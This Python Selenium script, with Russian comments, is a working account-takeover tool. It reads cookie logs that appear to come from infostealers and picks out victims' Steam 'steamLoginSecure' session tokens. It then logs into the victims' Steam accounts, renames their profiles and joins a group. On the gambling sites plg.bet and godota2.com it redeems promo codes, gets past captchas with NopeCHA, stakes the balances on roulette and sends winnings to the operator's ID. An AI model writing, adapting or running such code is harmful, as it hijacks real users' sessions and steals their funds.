import os
import json
import shutil
import sys
import psutil
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.common import TimeoutException, WebDriverException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options
import time
while True:
    folder_path = input("Введите путь к папке с файлами: ")
    if os.path.exists(folder_path):
        files = os.listdir(folder_path)
        if [file for file in files if file.endswith('.txt')]:
            for file_name in files:
                if file_name.endswith('.txt'):
                    file_path = os.path.join(folder_path, file_name)
                    with open(file_path, 'r') as file:
                        found = False
                        vac = None
                        steam = None
                        for line in file:
                            if "VAC Status:" in line:
                                vac = True
                            elif "steamcommunity.com" in line:
                                steam = True
                            if vac and steam:
                                found = True
                                break
                        else:
                            continue
                        if found == True:
                            break
                        else:
                            print("В папке нет куки. Только хуйня с .txt в названии.")
            if found == True:
                break
            else:
                print("В папке нет куки. Только хуйня с .txt в названии.")
        else:
            print("В папке нет куки. Возвращайся когда скачаешь.")
            sys.exit()
    else:
        print("Указанная папка не существует")
good_cookie_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Good Cookie")

for file_name in os.listdir(folder_path):
    if file_name.endswith(".txt"):
        file_path = os.path.join(folder_path, file_name)

        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()

            def find_value_between_strings(content, start_string, end_string):
                start_index = content.find(start_string)
                if start_index != -1:
                    end_index = content.find(end_string, start_index)
                    if end_index != -1:
                        return content[start_index + len(start_string):end_index].strip()
                return None
            faceit = find_value_between_strings(content, "CS Prime:", '\n')
            inv_dota = find_value_between_strings(content, "Dota 2 ", '\n')
            inv_csgo = find_value_between_strings(content, 'Counter - Strike 2', '\n')
            if faceit == "✔": # Кс го обработка куки
                os.makedirs(good_cookie_folder, exist_ok=True)
                csgo_folder = os.path.join(good_cookie_folder)
                os.makedirs(csgo_folder, exist_ok=True)
                shutil.copy(file_path, csgo_folder)
            elif inv_dota or inv_csgo: # Дота 2 and csgo обработка куки
                os.makedirs(good_cookie_folder, exist_ok=True)
                dota_folder = os.path.join(good_cookie_folder)
                os.makedirs(dota_folder, exist_ok=True)
                shutil.copy(file_path, dota_folder)
            # if faceit and faceit != "No game CS2": # Кс го обработка куки
            #     os.makedirs(good_cookie_folder, exist_ok=True)
            #     csgo_folder = os.path.join(good_cookie_folder)
            #     os.makedirs(csgo_folder, exist_ok=True)
            #     shutil.copy(file_path, csgo_folder)
            # elif inv_dota: # Дота 2 обработка куки
            #     os.makedirs(good_cookie_folder, exist_ok=True)
            #     dota_folder = os.path.join(good_cookie_folder)
            #     os.makedirs(dota_folder, exist_ok=True)
            #     shutil.copy(file_path, dota_folder)
            # elif inv_csgo:
            #     os.makedirs(good_cookie_folder, exist_ok=True)
            #     csgo_folder = os.path.join(good_cookie_folder)
            #     os.makedirs(csgo_folder, exist_ok=True)
            #     shutil.copy(file_path, csgo_folder)
def save_data_to_file(key, value):
    if os.path.exists("config.json"):
        with open("config.json", "r") as file:
            try:
                data = json.load(file)
            except json.decoder.JSONDecodeError: data = {}
    else: data = {}

    data[key] = value

    with open("config.json", "w") as file:
        json.dump(data, file, indent=2)

def read_data_from_file(data):
    if os.path.exists("config.json"):
        with open("config.json", "r") as file:
            try:
                json_data = json.load(file)
                value = json_data.get(data)
                return value
            except json.decoder.JSONDecodeError: return None
    else: return None
def browser_setting(headless, directory, file, site_cookie, site_nocha, site_tpm):
    options = webdriver.FirefoxOptions()
    if headless == True:
        options.add_argument('--headless')
    options.add_argument(f"--profile={directory}")
    options.set_preference("general.useragent.override", UserAgent().random)
    driver = webdriver.Firefox(options=options)
    wait = WebDriverWait(driver, 10)
    if not site_cookie or not site_nocha or not site_tpm:
        driver.get('about:debugging#/runtime/this-firefox')
        if not site_nocha:
            nocha_el = wait.until(EC.presence_of_element_located((By.XPATH, "//span[text()='NopeCHA: CAPTCHA Solver' and @title='NopeCHA: CAPTCHA Solver']")))
            site_nocha = nocha_el.find_element(By.XPATH, "..").find_element(By.XPATH,".//dt[text()='Внутренний UUID']/following-sibling::dd[@class='fieldpair__description ellipsis-text']").text
            save_data_to_file("id_nocha", site_nocha)
        if not site_tpm:
            tmp_el = wait.until(EC.presence_of_element_located((By.XPATH, "//span[text()='Tampermonkey' and @title='Tampermonkey']")))
            site_tmp = tmp_el.find_element(By.XPATH, "..").find_element(By.XPATH,".//dt[text()='Внутренний UUID']/following-sibling::dd[@class='fieldpair__description ellipsis-text']").text
            save_data_to_file("id_tpm", site_tmp)
        if not site_cookie:
            cookie_el = wait.until(EC.presence_of_element_located((By.XPATH, "//span[text()='Cookie Quick Manager' and @title='Cookie Quick Manager']")))
            site_cookie = cookie_el.find_element(By.XPATH, "..").find_element(By.XPATH,".//dt[text()='Внутренний UUID']/following-sibling::dd[@class='fieldpair__description ellipsis-text']").text
            save_data_to_file("id_cookie", site_cookie)
    driver.get(f'moz-extension://{site_cookie}/cookies.html?parent_url=')
    driver.maximize_window()
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.ID, 'ask_total_deletion_button'))).click()
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.ID, 'delete_all_button'))).click()
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="file"]'))).send_keys(file)
    time.sleep(0.5)
    print(wait.until(EC.presence_of_element_located((By.ID, 'info_text'))).text)
    try:
        driver.refresh()
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    try:
        steamLoginSecure = WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.XPATH, '//b[contains(text(), "steamLoginSecure")]/..'))).text.replace('steamLoginSecure:', '')
        print(f"steamLoginSecure: {steamLoginSecure}")
    except TimeoutException:
        domains = WebDriverWait(driver, 2).until(EC.presence_of_all_elements_located((By.CLASS_NAME, 'list-group-item')))
        found_sls = False
        for domain in domains:
            if 'steamcommunity.com' in domain.text or 'checkout.steampowered.com' in domain.text or 'store.steampowered.com' in domain.text:
                domain.click()
                try:
                    steamLoginSecure = WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.XPATH, '//b[contains(text(), "steamLoginSecure")]/..'))).text.replace('steamLoginSecure:','')
                    found_sls = True
                    print(f"steamLoginSecure: {steamLoginSecure}")
                    break
                except TimeoutException:
                    pass
        if found_sls == False:
            print("steamLoginSecure не найден в куках((")
            driver.quit()
            return True, None

    wait.until(EC.presence_of_element_located((By.ID, 'edit_button'))).click()
    time.sleep(0.5)
    name = wait.until(EC.presence_of_element_located((By.ID, 'name')))
    name.clear()
    name.send_keys("steamLoginSecure")
    time.sleep(0.5)
    domain_el = wait.until(EC.presence_of_element_located((By.ID, 'domain')))
    domain_el.clear()
    domain_el.send_keys("login.steampowered.com")
    time.sleep(0.5)
    value_el = wait.until(EC.presence_of_element_located((By.ID, 'value')))
    value_el.clear()
    value_el.send_keys(steamLoginSecure)
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.ID, 'save_button'))).click()
    time.sleep(0.5)
    try:
        driver.refresh()
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    time.sleep(1)
    return driver, steamLoginSecure.split('%')[0]
def plg_bet(driver, Promo_CSGO, bet_on_0, id_csgo):
    try:
        driver.get("https://plg.bet/ru")
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    wait = WebDriverWait(driver, 10)
    wait.until(EC.presence_of_element_located((By.ID, 'sign_in'))).click()
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'window_steam_button'))).click()
    time.sleep(1.5)
    try:
        wait.until(EC.presence_of_element_located((By.ID, 'imageLogin'))).click()
    except TimeoutException:
        print("Проблема с входом в steam. Пропускаю куки.")
        return "steam"
    time.sleep(0.5)
    try:
        driver.get("https://plg.bet/ru/bonuses")
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    time.sleep(1)
    wait.until(EC.presence_of_element_located((By.ID, 'promo-code-value'))).send_keys(Promo_CSGO)
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.ID, 'promo-code-activate'))).click()
    captcha_error = False
    time.sleep(5)
    try:
        status_text = WebDriverWait(driver, 40).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.window_error p'))).text
        print(status_text)
        if 'Для активации промокода необходимо получить уровень 2 (рядовой)' in status_text:
            return "csgo"
        if 'Сессия истекла, попробуйте снова авторизироваться на сайте.' in status_text:
            return "login"
    except TimeoutException:
        print("Ошибка с прохождением капчи(( Попробую ещё раз.")
        try:
            driver.get("https://plg.bet/ru/bonuses")
        except WebDriverException:
            print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
            sys.exit()
        time.sleep(1)
        wait.until(EC.presence_of_element_located((By.ID, 'promo-code-value'))).send_keys(Promo_CSGO)
        time.sleep(0.5)
        wait.until(EC.presence_of_element_located((By.ID, 'promo-code-activate'))).click()
        time.sleep(5)
        try:
            status_text = WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.window_error p'))).text
            print(status_text)
            if 'Для активации промокода необходимо получить уровень 2 (рядовой)' in status_text:
                return "csgo"
            if 'Сессия истекла, попробуйте снова авторизироваться на сайте.' in status_text:
                return "login"
        except TimeoutException:
            print("Ошибка с прохождением капчи(( Пропускаю сайт.")
            captcha_error = True
    if captcha_error != True and bet_on_0 == True:
        try:
            driver.get("https://plg.bet/ru")
        except WebDriverException:
            print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
            sys.exit()
        while True:
            balance = wait.until(EC.presence_of_element_located((By.ID, 'balance_r'))).text
            if balance.strip():
                break
        if int(balance) > 0:
            wait.until(EC.presence_of_element_located((By.ID, 'roulette_amount'))).send_keys(balance)
            while True:
                if wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'progress_timer'))).text != "***ВРАЩЕНИЕ***" and "Выпало число" not in wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'progress_timer'))).text:
                    break
                else:
                    time.sleep(1)
            print(f"Ставлю {balance} на zero")
            wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'green_button'))).click()
            time.sleep(35)
            try:
                driver.refresh()
            except WebDriverException:
                print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
                sys.exit()
            while True:
                new_balance = wait.until(EC.presence_of_element_located((By.ID, 'balance_r'))).text.strip()
                if new_balance.strip():
                    break
            if int(balance) < int(new_balance):
                print(f"Наша ставка сыграла. ЮХУУ. Теперь баланс: {new_balance}")
                if id_csgo:
                    wait.until(EC.presence_of_element_located((By.ID, 'message_text'))).send_keys(f"/send {id_csgo} {new_balance}")
                    wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'confirm'))).click()
            else:
                print("К сожелению наша ставка проиграла(")
        else:
            print("Баланс пользователя 0...")
def godota(driver, promo, ID, bet_on_0):
    wait = WebDriverWait(driver, 10)
    try:
        driver.get(f"https://steamcommunity.com/profiles/{ID}/edit/info")
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    time.sleep(1)
    try:
        steam_name = wait.until(EC.presence_of_element_located((By.NAME, 'personaName')))
        steam_name.clear()
        steam_name.send_keys("Just-Sant GoDota2.com")
    except TimeoutException:
        return "steam"
    time.sleep(0.5)
    wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, "button[type='submit'].DialogButton._DialogLayout.Primary.Focusable"))).click()
    time.sleep(1)
    try:
        driver.get("https://steamcommunity.com/groups/GoDota2dotcom")
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    time.sleep(1)
    try:
        WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.CLASS_NAME, "grouppage_join_area"))).click()
        time.sleep(2)
    except TimeoutException:
        pass
    try:
        driver.get("https://godota2.com")
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.XPATH, "//div[@class='top_signin']/a/img"))).click()
    time.sleep(1)
    wait.until(EC.presence_of_element_located((By.ID, 'imageLogin'))).click()
    time.sleep(1.5)
    driver.execute_script("document.body.style.zoom='75%'")
    wait.until(EC.presence_of_element_located((By.XPATH, '//span[text()="REDEEM CODE"]')) and EC.element_to_be_clickable((By.XPATH, '//span[text()="REDEEM CODE"]'))).click()
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.ID, 'ReferralCode'))).send_keys(promo)
    time.sleep(0.5)
    wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'REDEEM'))).click()
    time.sleep(1)
    info_elements = wait.until(EC.presence_of_all_elements_located((By.CLASS_NAME, "info")))
    while len(info_elements) < 2:
        info_elements = driver.find_elements(By.CLASS_NAME, "info")
    for text_element in reversed(info_elements):
        if text_element.text:
            if "Loading... Referral Code need time to load, please wait for a moment if there is no other notify." in text_element.text: continue
            elif "REFERRAL CODE" in text_element.text:
                print(text_element.text.split("REFERRAL CODE")[1].strip())
                if "Avoid spam account" in text_element.text.split("REFERRAL CODE")[1].strip():
                    return "dota"
            elif "ENTER CODE" in text_element.text:
                print(text_element.text.split("ENTER CODE")[1].strip())
                if "Avoid spam account, need 50 hours of playtime CS:GO" in text_element.text.split("ENTER CODE")[1].strip() or 'Launch Dota 2 and try again.' in text_element.text.split("ENTER CODE")[1].strip() or 'Avoid spam account, need to know more info, Please public your Steam profile and Game details.' in text_element.text.split("ENTER CODE")[1].strip():
                    return "dota"
            else: print(text_element.text.strip())
            time.sleep(0.5)
    try:
        driver.get("https://godota2.com")
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    time.sleep(2)
    wait.until(EC.presence_of_element_located((By.XPATH, '//span[text()="DAILY GIFT"]')) and EC.element_to_be_clickable((By.XPATH, '//span[text()="DAILY GIFT"]'))).click()
    time.sleep(3.5)
    wait.until(EC.presence_of_element_located((By.ID, 'dailygo'))).click()
    time.sleep(7)
    try:
        driver.refresh()
    except WebDriverException:
        print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
        sys.exit()
    if bet_on_0 == True:
        while True:
            balance_text = wait.until(EC.presence_of_element_located((By.ID, 'balance_main'))).text
            if balance_text.strip():
                balance = int(balance_text)
                break
        if balance > 0:
            wait.until(EC.presence_of_element_located((By.ID, 'bet_amount'))).send_keys(balance)
            while True:
                roll_status = wait.until(EC.presence_of_element_located((By.ID, 'TimeRun'))).text
                if roll_status.strip() != "Rolling...":
                    wait.until(EC.presence_of_element_located((By.ID, 'RouletteBET_0to0'))).click()
                    break
                else:
                    time.sleep(3)
            time.sleep(35)
            try:
                driver.refresh()
            except WebDriverException:
                print("Не удалось соедениться с сайтом. Проверь интернет-соединение.")
                sys.exit()
            time.sleep(0.5)
            while True:
                new_balance = wait.until(EC.presence_of_element_located((By.ID, 'balance_main'))).text.strip()
                if new_balance.strip():
                    new_balance = int(new_balance)
                    break
            if balance < new_balance:
                print(f"Ставка на zero сыграла баланс теперь: {new_balance}.")
            else:
                print("Увы.. Ставка не сыграла...")

def check_nope(driver, id_nocha, id_tpm):
    wait = WebDriverWait(driver, 10)
    driver.get(f'moz-extension://{id_nocha}/popup.html')
    power = wait.until(EC.presence_of_element_located((By.XPATH, '//button[@class="power"]')))
    credits = wait.until(EC.presence_of_element_located((By.XPATH, '//span[contains(@class, "value") or contains(@class, "color-warning")][@title="Credits remaining"]'))).text
    if power.get_attribute('data-enabled') == "true":
        print(f"Credits remaining: {credits}")
        if int(credits) < 5:
            power.click()
            print("Выключил NopeCHA")
            time.sleep(1)
            driver.get(f'moz-extension://{id_tpm}/options.html#nav=dashboard')
            script_tm_bt = wait.until(EC.presence_of_element_located((By.ID, 'div_NDI2ZGI5YWUtNDkwZS00MTM3LWEyMDktMzg2ZTZkZjViZjk4X2VuYWJsZWRfZW5hYmxlcg_enabled')))
            if 'enabler_disabled' in script_tm_bt.get_attribute('class'):
                print("Включил скрипт TamperMonkey.")
                script_tm_bt.click()
                time.sleep(0.5)
    elif power.get_attribute('data-enabled') == "false" and int(credits) > 5:
        power.click()
        print("Включил NopeCHA")
        time.sleep(1)
        driver.get('moz-extension://56a2172e-4fce-4887-b769-24c781cacce8/options.html#nav=dashboard')
        script_tm_bt = wait.until(EC.presence_of_element_located((By.ID, 'div_NDI2ZGI5YWUtNDkwZS00MTM3LWEyMDktMzg2ZTZkZjViZjk4X2VuYWJsZWRfZW5hYmxlcg_enabled')))
        if 'enabler_enabled' in script_tm_bt.get_attribute('class'):
            print("Выключил скрипт TamperMonkey.")
            script_tm_bt.click()
            time.sleep(0.5)

if not os.listdir(good_cookie_folder):
    print("У тебя нету хороших куки(. Скачивай новые.")
    sys.exit()
if os.listdir(good_cookie_folder):
    for file_name in os.listdir(good_cookie_folder):
        firefox_processes = [p for p in psutil.process_iter() if p.name() == "firefox.exe"]
        if firefox_processes:
            for process in firefox_processes:
                process.terminate()
        directory = read_data_from_file("Profile_Path")
        headless = read_data_from_file("Headless")
        Promo_CSGO = read_data_from_file("Promocode_CSGO")
        Promo_DOTA = read_data_from_file("Promocode_DOTA2")
        bet_on_0 = read_data_from_file("Bet_on_0")
        id_CSGO = read_data_from_file("ID_CSGO")
        ID_DOTA = read_data_from_file("ID_DOTA2")
        id_cookie = read_data_from_file("id_cookie")
        id_nocha = read_data_from_file("id_nocha")
        id_tpm = read_data_from_file("id_tpm")
        if not directory:
            while True:
                directory = input("Введи путь к профилю Firefox: ")
                if not os.path.exists(directory):
                    print("Указанный путь не существует.")
                elif not os.path.isdir(directory):
                    print("Указанный путь не является папкой.")
                else:
                    required_files = ['places.sqlite', 'cookies.sqlite']
                    files_exist = all(os.path.exists(os.path.join(directory, file)) for file in required_files)
                    if files_exist:
                        break
                    else:
                        print("Указанная директория не содержит необходимых файлов профиля Firefox.")
            save_data_to_file("Profile_Path", directory)
        if not headless:
            save_data_to_file("Headless", False)
        if not Promo_CSGO:
            Promo_CSGO = input("Введи промокод для CSGOPOLYGON: ")
            if Promo_CSGO.strip():
                save_data_to_file("Promocode_CSGO", Promo_CSGO)
            else:
                save_data_to_file("Promocode_CSGO", "HACK800")
        if not Promo_DOTA:
            Promo_DOTA = input("Введи промокод для GODOTA2: ")
            if Promo_DOTA.strip():
                save_data_to_file("Promocode_DOTA2", Promo_DOTA)
            else:
                save_data_to_file("Promocode_DOTA2", "SANTIK")
        if not bet_on_0: save_data_to_file("Bet_on_0", False)
        if not id_CSGO: save_data_to_file("ID_CSGO", None)
        if not ID_DOTA: save_data_to_file("ID_DOTA2", None)
        driver, steamid = browser_setting(headless, directory, os.path.join(good_cookie_folder, file_name), id_cookie, id_nocha, id_tpm)
        if driver == True: continue
        if not id_tpm or not id_nocha:
            id_nocha = read_data_from_file("id_nocha")
            id_tpm = read_data_from_file("id_tpm")
        check_nope(driver, id_nocha, id_tpm)
        error_csgo = plg_bet(driver, Promo_CSGO, bet_on_0, id_CSGO)
        if error_csgo == "steam":
            os.remove(os.path.join(good_cookie_folder, file_name))
            try:
                os.remove(os.path.join(folder_path, file_name))
            except:
                pass
            continue
        error_dota = godota(driver, Promo_DOTA, steamid, bet_on_0)
        if error_csgo == "csgo" and error_dota == "dota":
            os.remove(os.path.join(good_cookie_folder, file_name))
            try:
                os.remove(os.path.join(folder_path, file_name))
            except:
                pass
else:
    print("У тебя нету нужных куки")

time.sleep(10)
driver.quit()
print("All work done.")
